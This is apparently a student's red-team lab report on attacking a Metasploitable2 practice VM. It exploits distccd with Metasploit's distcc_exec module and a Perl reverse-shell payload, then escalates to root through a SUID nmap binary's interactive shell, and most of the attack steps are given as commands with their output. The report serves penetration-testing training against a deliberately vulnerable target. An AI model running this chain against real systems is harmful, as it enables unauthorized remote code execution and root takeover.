# ðŸ”Ÿ Lab10 â€“ distccd Exploit & SUID Nmap Privilege Escalation

My Red Team Journey â€“ From Recon to Exploitation | Lab10 Report

---

##  Description

In this lab, we exploited the **distccd (Distributed C Compiler Daemon)** service running on Metasploitable2. After gaining a limited shell as the `daemon` user, we escalated privileges by abusing a vulnerable SUID binary (`nmap`) to obtain full **root access**.

---

##  Target System

| Component          | Info                      |
|-------------------|---------------------------|
| Target OS         | Metasploitable2           |
| IP Address        | `192.168.56.103`          |
| Attacker Machine  | Kali Linux (VBox)         |
| Attacker IP       | `192.168.56.102`          |

---

##  Exploitation Steps

###  1. Nmap Full Port Scan

```bash
nmap -p- -sV -T4 -oN fullscan.txt 192.168.56.103
Detected service:

3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```


### 2. Remote Code Execution via distcc
```bash
msfconsole
use exploit/unix/misc/distcc_exec
set payload cmd/unix/reverse_perl
set RHOST 192.168.56.103
set RPORT 3632
set LHOST 192.168.56.102
exploit
```

 #### Privilege Escalation
### 3. SUID Binary Enumeration
```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
/usr/bin/nmap
```

### 4. Root Access via Nmap Interactive Mode
```bash

nmap --interactive
```

```bash
nmap> !sh
```

```bash
whoami
id
hostname
```

```makefile
root
uid=0(root) gid=1(daemon)
```


## Screenshots
lab10-nmap-scan.png: Full port scan showing distccd

lab10-metasploit-shell.png: Successful reverse shell from Metasploit

lab10-suid-nmap.png: SUID nmap binary found

lab10-root-shell.png: Root access confirmed via nmap interactive shell

## What I Learned
How to identify and exploit services like distccd

How to choose the right payload (Perl worked, Bash failed)

How to enumerate SUID binaries

How to leverage known tools (GTFOBins) for privilege escalation

The value of older software and misconfigurations in real-world pentests

